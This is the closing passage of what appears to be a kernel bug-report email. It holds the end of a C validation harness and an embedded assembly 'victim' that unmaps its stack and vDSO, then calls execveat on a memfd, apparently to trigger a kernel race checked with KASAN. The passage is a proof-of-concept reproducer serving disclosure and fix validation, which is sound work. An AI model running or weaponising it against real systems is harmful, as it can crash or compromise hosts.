	if (drain_exec_counter(&execs)) {
		fprintf(stderr, "failed to read final exec progress\n");
		failed = 1;
	}
	if (kill(victim, SIGKILL)) {
		perror("kill victim");
		failed = 1;
	} else if (wait_child(victim, &status) || !WIFSIGNALED(status) ||
		   WTERMSIG(status) != SIGKILL) {
		fprintf(stderr, "unexpected victim status: 0x%x\n", status);
		failed = 1;
	}
	victim = -1;
	if (!failed) {
		printf("[*] validated completion: affinity_success=%llu "
		       "attempts=%llu errors=%llu execs=%llu; no KASAN report\n",
		       successes, attempts, errors, execs);
		return 0;
	}

cleanup:
	for (i = 0; i < spawned; i++) {
		if (setters[i] > 0) {
			kill(setters[i], SIGKILL);
			wait_child(setters[i], &status);
		}
	}
	if (victim > 0) {
		kill(victim, SIGKILL);
		wait_child(victim, &status);
	}
	puts("[!] validation failed");
	return 1;
}
```

The embedded victim source and linker script follow.

`victim_min_execfd.S`:

```asm
	.section .text
	.global _start
	.type _start,@function
_start:
	mov %rsp, %r12

	/* Count this instance through the inherited eventfd. */
	mov $1, %eax
	mov $3, %edi
	lea one(%rip), %rsi
	mov $8, %edx
	syscall
	cmp $8, %rax
	jne .Lexit

	/* Drop the stack and adjacent vDSO/vvar mappings before exec. */
	mov %r12, %rdi
	and $-2097152, %rdi
	mov $4194304, %esi
	mov $11, %eax
	syscall

	/* execveat(inherited_memfd_4, "", argv, NULL, AT_EMPTY_PATH). */
	mov $322, %eax
	mov $4, %edi
	lea empty(%rip), %rsi
	lea argv(%rip), %rdx
	xor %r10d, %r10d
	mov $0x1000, %r8d
	syscall

.Lexit:
	mov $60, %eax
	mov $127, %edi
	syscall
	hlt
	.size _start, .-_start

	.section .data
	.align 8
one:
	.quad 1
empty:
	.byte 0
	.align 8
argv:
	.quad empty
	.quad 0

	.section .note.GNU-stack,"",@progbits
```

`victim_min.ld`:

```ld
ENTRY(_start)

PHDRS
{
	image PT_LOAD FILEHDR PHDRS FLAGS(7);
	stack PT_GNU_STACK FLAGS(6);
}

SECTIONS
{
	. = 0x400000 + SIZEOF_HEADERS;
	.image : ALIGN(16) {
		*(.text*)
		*(.rodata*)
		*(.data*)
		*(.bss*)
	} :image
	/DISCARD/ : { *(.note*) *(.comment*) *(.eh_frame*) }
}
```

The embedded image was built with GCC 16.2.1 and GNU ld 2.46.1:

```sh
gcc -c -nostdlib -o victim.o victim_min_execfd.S
ld -nostdlib -T victim_min.ld -o victim victim.o
test "$(stat -c %s victim)" = 848
readelf -h -l -S victim
base64 -w 76 victim
```


Thanks,
Weiming


